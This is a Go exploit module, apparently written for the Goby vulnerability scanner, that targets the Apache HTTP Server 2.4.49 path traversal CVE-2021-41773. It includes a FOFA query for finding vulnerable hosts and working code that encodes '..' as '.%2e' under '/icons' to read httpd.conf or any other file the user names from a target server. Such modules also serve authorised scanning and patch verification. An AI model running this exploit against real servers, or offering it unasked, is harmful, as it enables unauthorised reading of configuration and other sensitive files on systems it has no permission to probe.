package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache HTTP Server Directory Traverse Vulnerability (CVE-2021-41773)",
    "Description": "<p>Apache HTTP Server (referred to as Apache) is an open source web server of the Apache Software Foundation that can run on most computer operating systems. Due to its widespread use across platforms and security, it is one of the most popular web server software. It is fast, reliable, and can compile Perl/Python and other interpreters into the server through simple API extensions.</p><p>A flaw was found in the changes made to path normalization in Apache HTTP Server 2.4.49. Attackers can use directory traversal attacks to map URLs to files outside of the expected document root directory. If files outside the document root directory are not protected by the 'request to reject all' policy, these requests may succeed. In addition, this flaw may reveal the source of CGI scripts and other explanatory files.</p>",
    "Impact": "<p>A flaw was found in the changes made to path normalization in Apache HTTP Server 2.4.49. Attackers can use directory traversal attacks to map URLs to files outside of the expected document root directory. If files outside the document root directory are not protected by the 'request to reject all' policy, these requests may succeed. In addition, this flaw may reveal the source of CGI scripts and other explanatory files.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
    "Product": "APACHE-HTTP_Server",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache HTTP Server 目录穿越漏洞（CVE-2021-41773）",
            "Product": "APACHE-HTTP_Server",
            "Description": "<p>Apache HTTP Server（简称 Apache）是 Apache 软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其跨平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将 Perl/Python 等解释器编译到服务器中。</p><p>在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。 攻击者可以使用目录穿越攻击将 URL 映射到预期文档根目录之外的文件。 如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。 此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
            "Impact": "<p>在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。 攻击者可以使用目录穿越攻击将 URL 映射到预期文档根目录之外的文件。 如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。 此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源。</p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Apache HTTP Server Directory Traverse Vulnerability (CVE-2021-41773)",
            "Product": "APACHE-HTTP_Server",
            "Description": "<p>Apache HTTP Server (referred to as Apache) is an open source web server of the Apache Software Foundation that can run on most computer operating systems. Due to its widespread use across platforms and security, it is one of the most popular web server software. It is fast, reliable, and can compile Perl/Python and other interpreters into the server through simple API extensions.</p><p>A flaw was found in the changes made to path normalization in Apache HTTP Server 2.4.49. Attackers can use directory traversal attacks to map URLs to files outside of the expected document root directory. If files outside the document root directory are not protected by the 'request to reject all' policy, these requests may succeed. In addition, this flaw may reveal the source of CGI scripts and other explanatory files.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
            "Impact": "<p>A flaw was found in the changes made to path normalization in Apache HTTP Server 2.4.49. Attackers can use directory traversal attacks to map URLs to files outside of the expected document root directory. If files outside the document root directory are not protected by the 'request to reject all' policy, these requests may succeed. In addition, this flaw may reveal the source of CGI scripts and other explanatory files.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "banner=\"apache/2.4.49\" || header=\"apache/2.4.49\"",
    "GobyQuery": "banner=\"apache/2.4.49\" || header=\"apache/2.4.49\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.apache.org/",
    "DisclosureDate": "2021-10-06",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-41773"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-41773"
    ],
    "CNVD": [
        "CNVD-2022-03222"
    ],
    "CNNVD": [
        "CNNVD-202109-1907"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../conf/httpd.conf",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [
            "Apache"
        ],
        "Hardware": []
    },
    "PostTime": "2023-11-22",
    "CVSSScore": "7.5",
    "PocId": "10228"
}`

	sendPayloadFlagpRBAct := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		filePath = strings.ReplaceAll(filePath, `..`, `.%2e`)
		if !strings.HasPrefix(filePath, `/`) {
			filePath = `/` + filePath
		}
		filePath = `/icons` + filePath
		requestConfig := httpclient.NewGetRequestConfig(filePath)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, requestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadFlagpRBAct(hostInfo, `../conf/httpd.conf`)
			return resp != nil && resp.StatusCode == 200 && (regexp.MustCompile("This is the main Apache HTTP server configuration file").MatchString(resp.RawBody) || regexp.MustCompile("ServerRoot \"(.*)\"").MatchString(resp.RawBody))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			if resp, err := sendPayloadFlagpRBAct(expResult.HostInfo, filePath); err != nil {
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 {
				expResult.Output = resp.RawBody
				expResult.Success = true
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
